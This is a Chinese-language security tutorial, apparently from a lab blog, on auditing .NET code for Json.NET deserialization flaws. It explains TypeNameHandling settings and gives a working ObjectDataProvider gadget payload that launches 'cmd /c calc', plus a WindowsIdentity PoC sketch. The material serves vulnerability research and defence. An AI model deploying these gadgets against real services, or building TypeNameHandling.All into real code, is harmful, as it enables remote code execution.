### 云影实验室
#### .NET 高级代码审计（第二课）：Json.Net 反序列化漏洞
**作者：Ivan1ee@360 云影实验室**  
**日期：2019 年 03 月 01 日**

---

### 0X00 前言
Newtonsoft.Json 是一个开源的 JSON 库，其官方网站为 [https://www.newtonsoft.com/json](https://www.newtonsoft.com/json)。该库在 .NET 开发中广泛用于高效地读写 JSON 数据。常见的 JSON 序列化器包括 `DataContractJsonSerializer`、`JavaScriptSerializer` 和 `Json.NET`（即 Newtonsoft.Json）。由于其性能和通用性，大多数开发者倾向于选择 `Json.NET`。

尽管 `Json.NET` 提供了便捷的数据转换功能，但在某些情况下，不当使用 `DeserializeObject` 方法可能会导致反序列化漏洞，进而引发远程代码执行（RCE）攻击。本文将从原理和代码审计的角度对这一问题进行探讨并复现相关漏洞。

---

### 0X01 Json.Net 序列化
在 `Newtonsoft.Json` 中，通过 `JSONSerializer` 可以方便地实现 .NET 对象与 JSON 数据之间的转换。`JSONSerializer` 将 .NET 对象的属性名和值分别转化为 JSON 数据中的键和值。例如，定义一个 `TestClass` 对象，并有三个成员：`Name`、`Age` 和 `Classname`（被忽略），以及一个静态方法 `ClassMethod` 用于启动进程。

```csharp
public class TestClass
{
    public string Name { get; set; }
    public int Age { get; set; }

    [JsonIgnore]
    public string Classname { get; set; }

    public static void ClassMethod(string command)
    {
        // 启动进程
    }
}
```

通过创建对象实例并赋值，然后使用 `JsonConvert.SerializeObject` 方法进行序列化：

```csharp
var testClass = new TestClass { Name = "Ivan1ee", Age = 18 };
string jsonString = JsonConvert.SerializeObject(testClass);
// 输出: {"Name":"Ivan1ee","Age":18}
```

为了确保序列化过程不抛出异常，可以引入 `JsonSerializerSettings` 参数。以下是几个常用的设置选项：
- `NullValueHandling`：控制是否忽略值为 `NULL` 的属性。
- `TypeNameAssemblyFormatHandling`：指定类型名称格式，包括程序集版本和公钥等信息。
- `TypeNameHandling`：控制是否在序列化时包含 .NET 类型名称。

修改后的代码如下：

```csharp
var settings = new JsonSerializerSettings
{
    NullValueHandling = NullValueHandling.Ignore,
    TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
    TypeNameHandling = TypeNameHandling.All
};

string jsonString = JsonConvert.SerializeObject(testClass, settings);
// 输出: {"$type":"WpfApp1.TestClass, WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null","Name":"Ivan1ee","Age":18}
```

---

### 0x02 Json.Net 反序列化

#### 2.1 反序列化用法
反序列化是将 JSON 字符串转换为 .NET 对象的过程。通过调用 `JsonConvert.DeserializeObject` 方法来实现，传入两个参数：第一个是需要反序列化的字符串，第二个是序列化配置选项。

```csharp
var obj = JsonConvert.DeserializeObject<TestClass>(jsonString, settings);
```

`TypeNameHandling` 枚举值决定了反序列化过程中如何处理类型名称。默认情况下，设置为 `TypeNameHandling.None`，表示不读取或写入类型名称。

#### 2.2 攻击向量—ObjectDataProvider
如果开发者将 `TypeNameHandling` 设置为非空值（如 `Objects`、`Arrays`、`Auto` 或 `All`），则可能引发反序列化漏洞。官方文档也对此进行了警告。

例如，使用 `ObjectDataProvider` 类调用任意引用类的方法。首先序列化 `TestClass`：

```csharp
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All,
    TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full
};

string jsonString = JsonConvert.SerializeObject(testClass, settings);
```

构造恶意的 JSON 字符串，替换 `ObjectInstance` 和 `MethodName` 的值：

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c calc"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}
```

通过 `JsonConvert.DeserializeObject` 反序列化该字符串，成功弹出计算器。

#### 2.3 攻击向量—WindowsIdentity
`WindowsIdentity` 类位于 `System.Security.Principal` 命名空间下，用于表示基于 Windows 认证的身份。此类定义了一系列属性，如 `AuthenticationType`、`Groups`、`IsGuest`、`IsSystem` 和 `IsAnonymous` 等。

##### 2.3.1 ISerializable
`WindowsIdentity` 继承自 `ClaimsIdentity` 类，并实现了 `ISerializable` 接口。`ISerializable` 接口只有一个方法 `GetObjectData`，用于完全控制序列化数据。

##### 2.3.2 ClaimsIdentity
`ClaimsIdentity` 位于 `System.Security.Claims` 命名空间下，由一组声明（claims）构成。常见的应用场景包括登录 Cookie 验证。

##### 2.3.3 打造 Poc
通过 `GetObjectData` 方法添加恶意的 `BootstrapContextKey`，最终实现 `ISerializable` 接口进行攻击。定义 `WindowsIdentityTest` 类并生成 Base64 编码的 Payload：

```csharp
public class WindowsIdentityTest : WindowsIdentity, ISerializable
{
    public WindowsIdentityTest(SerializationInfo info, StreamingContext context) : base(info, context)
    {
    }

    public override void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        base.GetObjectData(info, context);
        info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)));
    }
}
```

生成的变量 `obj1` 即为 Poc，将其 `$type` 值改为 `System.Security.Principal.WindowsIdentity` 完全限定名，然后进行反序列化，触发计算器。

---

### 0x03 代码审计视角
从代码审计的角度来看，漏洞的关键在于 `TypeNameHandling` 枚举值不是 `None`。例如，以下 JSON 类设置为 `TypeNameHandling.All`，攻击者只需控制传入参数 `_in` 即可轻松实现反序列化攻击。

许多 GitHub 上的 JSON 类存在类似漏洞，只要 `TypeNameHandling` 不是 `None`，就可能触发漏洞。

---

### 0x04 案例复盘
通过实际案例复盘整个过程，在 VS 调试中通过反序列化漏洞弹出计算器。

1. 输入 `http://localhost:5651/Default` 并加载 `value` 值。
2. 通过 `JsonConvert.DeserializeObject` 进行反序列化，弹出计算器。

附带动图展示。

---

### 0x05 总结
`Newtonsoft.Json` 在实际开发中使用率很高，攻击场景丰富。作为漏洞挖掘者，应重点关注此库。建议选择 `ObjectDataProvider` 作为攻击向量，因为生成的 Poc 体积较小。后续笔者将继续推出高质量的 .NET 反序列化漏洞文章，欢迎持续关注。更多 .NET 安全和技巧请关注实验室公众号或笔者的小密圈。

**云影实验室**